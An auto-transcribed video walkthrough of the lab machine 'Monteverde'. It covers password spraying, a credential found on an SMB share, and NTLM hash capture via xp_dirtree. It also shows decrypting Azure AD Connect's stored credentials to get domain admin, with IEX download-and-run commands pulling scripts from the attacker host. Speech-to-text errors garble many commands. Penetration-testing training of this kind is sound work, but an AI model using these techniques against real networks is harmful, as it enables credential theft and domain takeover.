 what's going on YouTube the zip segment with Monte Verde from half the box which is another box without a web server this one is just an Active Directory domain controller with a service called ad Connect on it ad Connect is a Microsoft supplied application that allows password synchronization between your on-premise Active Directory and Azure or office 365 this allows your users to have the same password between office 365 and their normal domain login like the desktop login so if they change the password one it changes it on the other the issue with this is Microsoft has to store the password somewhere in this case it's stored in an encrypted form and a Microsoft sequel database but eventually it has to use the password so it has to decrypt it and you can use the actual ad Connect service to decrypt the password once you get the hash and once we get the hash we're going to be an administrator user so with that being said let's just jump in as always we start with the end map so - I see four default scripts as V enumerate versions Oh a up at all formats put in the end map directory and call it monteverde and then the IP address which is 10 10 10 172 but before you run this we are going to put a studio here because Ed Maps detection algorithm differs whether your route and not route and route as the better detection algorithm if you don't believe me and check out the next video this can take some time to run so I've already ran it looking at the results we have quite a few ports open the first thing I notice it's most likely a Windows server just because nmap is screaming Microsoft Windows but let's go through each of these we have a DNS on port 53 Kerberos on 88 MSRP CM 135 and 4 for 500 DAP is open and it's telling us the domain is megabank dot local and we also have I guess like encrypted LDAP right here I believe that is but enough things to know this is most likely a DC we don't see a web server or anything like that so I'm going to start off with just attacking SMB and LDAP the clock skew is a minus 48 minutes so if we were doing any type of like crypto attack may be forging tickets and a golden ticket so we're ticket one of those type of attacks we may want to make sure that clocks are synched but right now it just doesn't matter so the very first thing I want to do is check out our PC client wait what was I looking at real quick oh we can look at DNS real quick nslookup and then do server 10 10 10 140 about 172 I look up like localhost see what this says it's host name is localhost let's do 10 10 10 172 look up its own IP and doesn't look like we get anything sort of fail so I wonder if maybe this IP address got renamed and something is wrong I'm gonna check out megabank dot local which is what nmap said we do see it's IP as 10 10 10 172 so I don't know exactly what it's hertz name is we could try like monteverde the name of the box and we don't get anything so maybe at the end of the video we should just like dump the DNS database to see if there's something weird I want to say when you normally query a domain controller for its own IP it leaks the host name but not positive about that one so we'll do that after we complete this box so we can start off with like checking RPC client with like no less education I think it's a lower case you will do 10 10 10 172 probably upper case you and we get an authentication so like the previous videos I'm just gonna run II knew Tom users and we're going to list all the users here we could go a step further and enumerate each user but I'm having a brain fart with what command that is so I'm just gonna hit tab twice and then hit yes to show all commands and I believe it's this query display info additionally you could just open up Firefox and either Google what you want to do an RFP C client we're good were like if sector ox search the term like RPC and I'm kind enough to put all the commands I run in videos or a lot of them in this website so you can see using our PC client to dump Active Directory information query display info so if I just run this command we could get a bunch of information you can look at other things you can do with this and also if you go and search like double tap maybe ad you can see back in the forest video we pretty much do the same thing over LDAP so I don't want to go explain it again but that is that so let's go do a new dumb users again and we want to build a word list around all these users so let's copy this open up a new tab beam users dot list I don't know I said beam it's vim but so I'm just gonna do 6 X to delete the first six characters everywhere and then we can do D dollar I can probably run a said script to do this but I'm not a wizard when it comes to regular expressions and this doesn't take too long to manually do it by more than 10 users I probably would have looked into automating it but that is that so one of the interesting things I see here is this a a d9 870 at 7:00 this is a active directory ad sync thing to sync passwords between Asia and a on-premise domain controller so let's just save this and I'm just gonna run crack map exec - you users dot list and we're gonna give - P passwords don't list or users that list so we're using the username as the password in a perfect world I'd probably customize the word list so I do like CP users that list password dot list and go into this and also put things like summer spring winter password and then we'd run like hash cat - - force as a dash - SD out - our users share - cat rules and then maybe like best 64 dot rule and then pass with dot list take it all these arguments right maybe I did not again if you go to hip sack do like hash cat word list using hash cat to generate a custom word list so we could try this mute and go up a few seconds play so that I'm generally the word list see okay - - forced - - STD alt word list - are that's oh it worked so I had all the arguments right so we have everything here it's quite big so we could then just direct it to a file path with LST and then you have a good password list so WC - OH password Dallas oh because I used the same exact foul name as what - McCall at ie racist file I do this so freaking often putting the same thing twice but you get how that works so let's just go back and do crack map exec and before the username we have to specify SMB and then the IP address ten ten ten 172 I think that's correct order run this and see what it says there we go we get a bunch of login failures and before we run this you may want to do crack map exec we got a hit sa batch jobs is both but you may always want to check the password policy so 10 10 10 172 - - pass Paul and see if it does it without a username password we may have to specify nothing nope we don't so this is dumping the password info for the domain and we can see let's see account lockout threshold is none if you see like three or something you should always be careful with locking accounts out but here we have account lockout is disabled which meant it was safe to do this brute force there's always the chance that they have some type of logging and they detect the brute force so it's not safe in an object thing but if they're not doing wall again they're not locking out then go ahead and brute force I guess so we got sa batch jobs so we don't have a pwned thing here so we don't have admin privileges but let's see what can we do we could try evil win RM to see if we can do this or I think crack map exec is that PS exec no that's not it mssql win RM so we could try win RM to see if this user oh crap we probably just want to do sa batch jobs as both the username and password and then see if this detects that we can get a login shell if we don't then the other thing we have is the ability to do like share numeration so we failed to authenticate so let's try SMB map and we can do - you - P I think it's - capital H 10 10 10 172 and we're just looking at what file shares this guy has access to and we could also do SMB map - you nothing for null - H 10 10 10 172 maybe like SMB client - you open all 10-10-10 172 we need - L - L will list the shares and interesting enough SMB client doesn't support in all authentication we could try like guest or anonymous but we get login failures so we do have access to looks like as your uploads net login IPC Sissel and users so let's go take a look at users and I think it was in the nest we actually did SMB client like the mount command to mount each of these to a desktop I'm not gonna worry about that I'm just gonna specify I think it's the - our flag and SMB map so whoops that's - capital H - H and we can look at what these do so - R is going to recursively list directories list contents so we probably want - lowercase R and we can exclude shares with - - exclude so let's do - - lowercase R + - - exclude we probably don't want the sysvol or the IPC because these are just gonna have a bunch of junk in it I can run this command after so you can see the junk in them but generally that's not gonna be too interesting so we can run this and I hope it's comma-separated and that would make sense so if it dumpsters then we know yeah it's not comma-separated so you can see the junk in this VI PC showing you all the I believe it's named pipes but users doesn't really have anything in it we see the usernames and that's it so we don't have privilege to go into the user directories sysvol this is going to be like the active directory information we got a bunch of named pipes here so anything that's super interesting haven't actually looked at these PG so this is saying that there is a sequel server here I don't know what this Google crash service is I don't think anything Google's installed so we may want to look at that but nothing too interesting and then as your uploads it's actually not listing the file weird rip I do - capital R and this is kind of why I normally prefer mounting things because you always have these like weird edge cases with tools that just works like 99% and that 1% if it's missing what you're expecting you don't really notice it and you just overlook it so we're trying it with a - capital R to see if yep so we want to - Kaplow what was the syntax on those two again well let's see recursively list directories and files lists contents of directory D for is to list a root so maybe this doesn't go recurse yeah it's missing the word recursively and this - our I think my mind just said - ours recursive and just assumed it would always be but no we want - cat Laura okay so we do have privileged to get into the M hope directory with this as our XML and I knew something was off with the output when I was looking at the system all I was like no we should be able to read that and get a lot more information like the group policy stuff but just didn't cross my mind that we weren't recursively going into it so azure upwards is empty but em hope does have a file so let's see we could do SMB client like this - you and then specify slash slash users like this and authenticate with the password of sa batch jobs and then get a show dot XML boy weep I have to go into M hope get a sure XML but where's the fun in that let's do this from SMB client or SMB mat because I don't know how to do that hand so I think - - download sounds good so we can do SMB client nope SMB map - - download users em ho XML see if this downloads as we expect it and it looks like it does and one cow it puts the foul name in case we wanted to do like a batch download or something there are a bunch of servers you have like the IP address path and then file so looking at this we can see a plaintext password another day another dollar so we can grab this and exit LS so we can do SMB map or let's do crack map exec SMB 10-10-10 172 - you user dot list - p put the password put it in single quotes because this has quite a few special characters and then see whose password this is I was a betting man I would say it's M hope because it's the directory that we had found it in and indeed it is we don't have the pound thing so we can't just PS exact to get a shell but we can change this to be when RM and see if she has Windows remoting privileges so running this come on any minute now authenticating and we get a pound so now we have a reverse shell so let's do evil win RM so evil win RM - you and hope - P that's not the password copy and - I for IP 10 10 10 172 and run this and looks like we get a shell if I was on an actual engagement I would run first name Who am I and ipconfig to get a pretty nice screenshot showing we are on the Box monteverde as M hope and here's the IP address it's just good to have this information in a screenshot but the thing we want to look do probably is a numerate for a privilege escalation and I'm gonna check seatbelt because I haven't ran this and I'm just curious so I'm just gonna locate it and then we can probably run upload upload is a evil winner M syntax it should support directly uploading a file and I want to say it may actually not work I think we did this and probably Resolute's video and it was the like um wrong encoding let's see what here we get whoops I just seatbelt Exe pikin type dot backslash is it dot /yeah not a valid application with a service platform so let's change it up and download so python 3 - m HTTP server and i don't have to do sudo with this because i'm listening on port 8000 if i try to put this to port 80 I think I just put 80 here we give permission denied because I'm not route so let's do what is it we can buy curl it curl 10 10 10 172 / seatbelt exe - OH seatbelt Exe and specify port 8000 and 14 - I think I'm that's my IP address if config tun 0 we are 10 10 14 - and found not found oh we have to copy it so let's make there dub dub dub so we don't leak all of our files in our working directory locate seatbelt CP copy it to our directory and let's try this again 200 okay sounds much better and now we have the tool and it looks like it runs which is awesome so if you want to know how to get seatbelt pretty much just check that resolute video so let's see - group equals all - group equal all and we'll let this run and it completed in 91 seconds so a minute and a half I'm just gonna go oh let's do C colon backslash users M hope I'm just gonna hit page up whoops too far up and here we go here's where you begin and after I run seatbelt I'm gonna go back and we're gonna run wind peas just to see the difference I always like running multiple audit checks so let's see Auto runs VMware tools all these cloud things what do we do chrome chrome Chrome cloud credentials credit Noom cred guard DNS cache what version done it'd be Pepi master keys environment path environment variables explicit logon Firefox stuff some idle time and store products so we do have Google Chrome installed on this so that explains that Google crash service named pipe we saw at the beginning the video we're looking at the chairs so let's see bunch of applications installed we can see Microsoft Azure ad connect right here which is interesting see interesting files processes settings local GPUs local groups we can see when a backwards compatibility group windows have token global I don't know exactly what this means something to look into I guess after this oh these are groups on the Box not groups that were a member of okay let's see a tea sink and mints we get a lot of stuff about this ad sync service account for synchronization service running on the computer named pipes a bunch of information that doesn't look too beneficial scheduled tasks we have access denied windows credential file but this is pointing us to em hope which where that user so I'm not too interested in it because we really know em hopes password firewall stuff Windows vault and that is about it so let's go take a look at another tool and that is wind peas so let's go into this WWWE and then find win pzx e alright locate and let's go and grab this one I choose you CP tor directory run that curl again but this time say when peas dot exe and then we'll execute it and I like going through this tool because it should be colors although that being said okay I was gonna say it had said something about antique all a bit for windows is not set but we do get colors so I'm gonna pause the video again and we'll let when peas run and go look over all the results and it'll probably be easier to go through because of the color coding so and now that it's done we can just go up to the top and see what this tool says okay PowerShell settings lapse now let's say credential guard cached Peter named nothing too interesting yet mostly is just putting everything that says name and read no AV it's saying that we have mission to create directories on C colon backslash which means if there's a service that has a binary path that's unquoted with a space we can do some type of injection there but seatbelt would have shown that and when P shows that cell there's no vulnerable services and that's the unquoted service path thing if you want to Google something Google unquoted service path logged on users RDP sessions auto log-in creds password policy I'm just going looking for red we do have Microsoft sequel server so generally when I see sequel server I run commands to see if we can do like XP command shell I think it is XP underscore CMD shell to execute commands as the sequel assist service because oftentimes sequel will also be an admin so we can probably run like powerup SQL to check all that now let's see firewall rules nothing too interesting so didn't really get anything well we can do Who am I slash all and we can see we are a member of azor admins so maybe the tool should check that because I think this is what gives us access into the azure database on the server let's see a sure admin see current groups so it does detected the group it just doesn't highlight it so we missed it there got token groups here so this is seatbelt seatbelt does show it seatbelt does showed on the group name I just again missed it because it wasn't color coded so sequel CMD on the box we put a bad command we get error so we can we have sequel CMD I think - capital L will look for a sequel instances on the network and as I did that realize okay I thought it could have taken a while so we don't really get that much information pink - H maybe - capital H - question mark there we go will give us all the commands this thing runs so we got - queue for a command-line query and we can do show underscore DB maybe add a command now select stir from sis dot database databases whoa we hit a jackpot there may be described I don't know ms SQL go up and we can see all the column names here so create date and probably name so let's see name and create underscore date I said data date so we can see all the names and when they were created on the server so ad sync was installed on 20 2001 so January of this year it was installed at 253 p.m. but if you don't know a lot of this C syntax I don't blame you as you can see I was struggling so there is a tool called power up SQL as it just having an opt we don't have yet so let's download it github powerup SQL and we can grab the tool get clone and CD powerup SQL let's just copy the dot ps1 file to HDB monteverde and we put it in the dub-dub-dub directory and I know evil win RM has some like hidden options where you can have this automatically import PowerShell scripts but I just have bad experiences with that so I always do IX new object net web client download string HTTP 10 10 14 to 8 thousand power up SQL ps1 ok well that goes power up SQL cheat sheet does this not one I often use I'm just going to close this looks like that's a old tab so let's see get SQL instance verbose and this is a command that is inside of power up SQL and looks like we don't have permission to this get WMI object thing let's see instance beuse I'm looking for one for like privilege escalation here we go SQL let's do invoke SQL audit and I'm just gonna specify - Bruce and we'll see what this says if we didn't have a burst everything here probably would not be said right here it's checking for like XP file exist XP CMD shell and things and seeing if we can actually execute it now it's checking all the databases if we have anything so I'm just going to let this run and we will resume when it's done and almost finished soon as I finish saying that so we have quite a bit of information here let's just go to the top what was it invoke audit on it yeah that's just a page up okay so let's see running so I wonder if we can search semicolon start there we go so starting the vulnerability check of default login now it's checking some weak passwords looking for impersonate login another impersonate login seeing if we can change database ownership we don't have anything looking at like the create procedure looking at XP dirty if we had any of these file things we could potentially write a file as this user but more importantly we could try to write a file or include a file from our server and really make it do a request back to our server over SMB we can steal the hash of the user that is trying to log into an SMB share with let's see and I bet if you just went back to EPSA trucks and shirts for like XP underscore there we go and the query video we do that so get a lot of information from that site but looking through things thanks gives owner does that really look like we have anything is vulnerable yes is exploitable no I don't know what difference between vulnerable and exploitable is oh here we go oh this is a list of I guess vulnerable things so ownership Cheney was found to be enabled so it's vulnerable because this functionality is there but nothing's configured in a way that we can exploit it looks like so this one is still that looks like all these are database owner accepts privilege XP der tree oh we do have this command so we could potentially try to crack that password let's see let's see if I can do this off of memory wow this is a lot of information gives CMD underscore shell so let's try X Peter tree can we do like SQL CMD was it - capital kill 10 10 14 to test responder - I ton 0 judo I don't like all the syntax warnings maybe put this in quotes and we can get a password hash so that's definitely interesting I'm gonna dig down this rabbit hole real quick cuz I'm not sure if this is actually crackable I don't have crap let's see do I know the password to this I do so the Kraken is just a local box on my network that I use for cracking because it's a very CPU intensive thing and I don't want to do this on well number 1 in a VM and number 2 on the machine I'm recording from because I could start dropping frames so let's see let's go to hash cat b hashes monteverde paste and this is let's see - cat example hashes let's see what is this let's find that until env2 that looks okay so 5600 ash Ketcham 5600 ashes monteverde opt word list rock you and will do rules that 64 let's see can we get a shell as this user and I don't think it cracked recovered is you out of one so this is what you'd keep doing and maybe get a shell maybe you don't if there was another windows box we could potentially do a ntlm relay attack but you can't relay the hash back against its own server so that's not going to be too interesting so let's move on and go through the intended path if you did a bunch of googling around the azure ad privilege escalation maybe let's see is this going to be it bunch of blogs the one I like is from XP n so I'm just going to search that blog XP and set calm as your ad connect for red teamers I think this was the first one that went into this detail so this is going about setting up the lab essentially what this part is saying is as your ad connect is a tool to synchronize password hashes between Asha aka office 365 and your on-prem so if you use office 365 for your organization you may want to have the same password for email as they do to log in I think it's kind of a silly thing to do if you're not really a super familiar in Azure because it kind of just opens up your local Active Directory to the cloud and people can potentially brew it for us to get usernames passwords etc but a lot of people like doing it because they like password synchronization so this is how Microsoft sinks those too they use a program like a charade eConnect I don't think it's actually a thing anymore in 2018 2019 majors have it built 10 but I'm not paused about that one so PHS password hash synchronization when you read this so it's talking about it right here they're selecting stuff from a database so inside the azure ad connect database we go back up here where was that select name create date inside this ad sync database there is a mms management agent in private configuration XML so these two fields are let's just grab this let's see paste and paste and this is from what is it ad sync dot what is the table and then field let's see maybe here so select I'm a type is that looking at like maybe I just do I gotta do from something right yeah well let's see well notice from MS management agent so I copied the wrong thing let's do ad sync dot this if we just do private configuration select we need from do we put does it dot eighty sync here one if we can't do that in Azure let's do use ad sync there we go so if we get private configuration XML from this table on the database ad sync here's what it contains we have the forest name for skewered forest login and forest login domain we grab the encrypted configuration as well it's going to display all the same thing except we have a encrypted password here I don't know what's up here or C - we don't know what that is phew echo - and this phase 64dd and x XD a whoops I am on my reverse she'll go down here on the same thing you can see the encrypted password definitely looks encrypted we don't get a lot of plaintext but what they do on this tool is they actually import the em crypt DOL which is a dll for this and then use the internal commands to M crypt to just decrypt it because for a sure ad sync to work it has to know the password somehow so they just encrypt it probably with a static string across all installs because that's what organizations like doing and then you get the password so let's see we need to probably populate something maybe actually stored within that crypt P or C so let's copy this and walk through what the script does okay V decrypt ps1 paste I wish I had syntax howling and BIM enabled C I wonder if I see P decrypt to decrypt Sh we got something syntax highlighting is better than none so let's see right here we are opening the database creating the command and we're getting key set ID instance ID and entropy so we wanted to get go back up here and run all that so it's doing select key set ID instance ID and entropy from mms server configuration so you can see one here's the in society here's the entropy this entropy is used oh it's not a static key to decrypt so it's probably you entropy plus a static key so think of this maybe as a salt so if you didn't have this piece of information you probably can't decrypt with that DLL so we'll figure out as we keep going through this so right here we're assigning each of those fields to a variable like key ID is the first number that was one then instance ID is the gooood and entropy is gooood 2 so 0 1 2 and then we're closing that reader so now we're going to run a second command and this is going to be pretty much what we did the first time we're looking at the private configuration encrypted configuration and it's getting string 0 so config is going to be on config variable and cryptid is on 1 and then it closes so here we're loading the encrypt DOL and then specifying maybe this is class path I always forget terminology but loading it and now we're actually calling the load key set function or method out of that do L and then getting active credential key get key and then key 2 is decrypting the base64 converting it to a string and then selecting all the XML out of that private configuration to get this stuff so let's see what happens when we run it let's do IX no object net web client download string and 1014 to 8,000 decrypt ps1 sure and it's running taking a while to run I did not expect to take this long so maybe something went wrong let's see do not return a proper response Oh when RM crashed that is weird and try riding this again does it crash win RM every time we get the session here it looks like it does huh so let's go and break this down and see exactly where it's failing so I'm going to switch to a new pain get the shell and then I'm going to cat dub-dub-dub slash was it decrypt dot ps1 let's just do head - 10 to do 10 wins and let's step through exactly what it's doing so right here we're creating the SQL connection so paste this and then we're opening it up so this creates the object and then this does the actual connection and it looks like it is taking its time let's see is it going to fail and let's see a network related instant specific error occurred when established connection the sequel server server is not found or accessible verify the instance name is correct and the sequel server is configured to allow remote connections so there's two things here we're not doing a remote connection we're doing a local connection and maybe the syntax is off if we look at the blog post I think it's doing a Express install yeah it's using sequel with Express settings so let's go and copy the this one if we have examples of this exact command so go to Google test a sequel connection we can see other ways of doing this connection string so this is data source database ID password let's see PowerShell - sequel server SQL PS so server integrated security true initial catalog master so let's try this let's take this string and see what happens if we do this one copy and let's go here change this so we want server I'm not going to specify the username I'm just gonna do localhost and a grade security is true and initial catalog let's do what is it ad sync I'm sure there's probably a database flag as well we could do instead of initial catalog now let's open this and see if airs that looks good so we can keep running through this to make sure we actually get something so copy this next thing execute the reader so this is executing this SQL command reading the result and assigning key ID and if we get one here we know it worked so we just need to replace the string here so let's go be decrypt the dub-dub-dub decrypt ps1 and let's see SQL connection paste okay oops I meant to do search right now I am just searching for SQL client SQL connection to see if this exists anywhere else in the script doesn't look like it does so save these changes go here and let's copy this IX and run it again and there we go we get megabank dot local using an administrator password domain admin yeah so we can go back look at crack map exec oh we can just do administrator I guess and dash p put the password probably should have put it in single quotes because it has some special characters so we'll see how crack map exec handles this and I don't want to do when our App Mode I want to do SMB mode and we can see the pound so if we do PS exact PI administrator at 10-10-10 172 paste the password and we're getting a shell as the system user on this box so there's one thing I want to do on this before we close off the video and I haven't actually looked at this but I want to look at just this one binary let's see that DLL so I'm going to because the blog post I don't know if it goes into everything three oh he does so you got this out of that em DOL and looks like you probably just decompiled that I'm guessing that's a dotnet thing so that's what we're going to verify now so let's see dub dub dub decrypt ps1 and I want to go and look at this binary so CD and then download em crypt DOL eggs over here file encrypt DLL we can see it is indeed a dotnet assembly so we should be able to go up and my commander is not here let's see command L looks like I have to start this screen hopefully it doesn't do windows updates don't need these tabs and I guess we can start the SMB server so let's move em - I guess SMB and then was it in packet SMB server - SMB to support - user hip sac - password please subscribe the share name we'll call this one like this video and then the share path we have to do it with sudo we should be booted up pass would maybe drive it as please subscribe I do have that's the password so let's see was it was the decompiling tool I normally use well I'm drawing a is it il il spy no maybe that's not it it was a dark theme let's go back to AB sector rocks decompile dance by on the command now we can 172 1610 think 209 is my IP of Kali a parrot path was like this video got to my desktop and do file open see see : user zip set desktop m coupe do l and let's see key encrypt string to base64 decrypt base64 to string that is one of the functions we had called so let's take a look at the script again em dub dub dub decrypt dot or do SH so we have the syntax highlighting so the very first thing we do is load key set get active credential key get key and decrypt so we're in Microsoft directory service metadata services time to feed key manager so let's go back over to here m crypt Microsoft directory services meta directory service cryptography and we were in key manager that's the classpath we loaded so we can see all of these so get key and you can see it takes two variables the key ID and PP key so if we look back here let's see would set key get key this is going to be the instance ID and key to we're passing it null which is nothing load key set you can look at that as well it's taking entropy MMS key set ID if you look here and to is entropy instance ID and key ID so you can see everything it is doing it's just loading this dll and calling these as it needs it so the next one was what get active cadential key right here and let's see what is cryptid equal our cryptid this is the result of encrypting configuration right here and decrypted this is where it saves it to see the interesting thing is I guess it's automatically using this gate key and get active credential key so if we look at this decrypt base64 to string let's see what it does that was under key I believe see whoops do not mean to click that please the encrypted plaintext guessing this dot MP key is grabbing the active key which is from this gate key thing so there was one last thing I wanted to look at and that was the DNS zone just because I'm curious what IP this guy thinks his himself is because in active directory you generally never want to change the IP address of a domain controller and I believe the IP address may have changed because generally when people create boxes they assign an IP then give it to hack the box and hack the box changes the IP so I just want to export the DNS zone and see if that is the case here so let's see let's go back to which pain had the admin password I don't actually know that I'm gonna password is that is is it not this one weird I guess we can just run this again let's see SH let's go to CD depth of dub Python 3 - m HTTP server and then IX new object net web client download string HTTP 10 10 14 to 8 thousand decrypt ps1 okay I can't believe I typed that without a type L but not the password here and let's do even win RM I don't know if we need to be an administrator to run this I'd presume not but it's always safer to do it from administrator so - new administrator - P - I 10 10 10 172 and we should be able to get a shell and I think it's export DNS zone - IO name test - maybe zone mega bank top local and we don't have that snippet PowerShell dump DNS zone export DNS servers own DNS servers own suite it's taking a bit longer so I'm guessing this time it's actually exporting and we can do GC forget content test LS did not dump it maybe it's - file not file name file name - zone is not a thing maybe - name yeah so file name and - name sometimes it helps to read the documentation before you go in be able to locate the zone for megabank local on server monteverde what I thought it was that was the domain exit back map exact SMB 10-10-10 172 see megabank dot local it should be a PowerShell list DNS zones get DNS server zone let's try this command - name megabank dot local on server - file test ok I think it was saying the file existed and we're not writing where we think we are is by running it in like sequel and windows system32 see : users administrator documents see where does it extract the zones to filename let's see does the error message say Microsoft dot dot dot say dir it's probably in window somewhere let's see PowerShell search for file GCI gets out item - recurse C - include I think GC i recurse include make a bank let's go take a little bit C export DNS server zone what do we just don't give it a filename if it goes to stand it out let's try this real quick oh there we go sequel in windows system32 DNS so let's see evil win RM we want to do the administrator come on connect CD windows system all I don't think that's it system 32 DNS there we go and we can type and let's see what its IP addresses no looks like it is correct 10 10 10 172 let's see Monteverde is set to the correct IP address here so this is kind of handy to do when you're on a box it want to look at all the DNS records you can just export this and then you'll have all the host names of the zone but that'll be the video hope you guys enjoyed it take care and I will see you all next week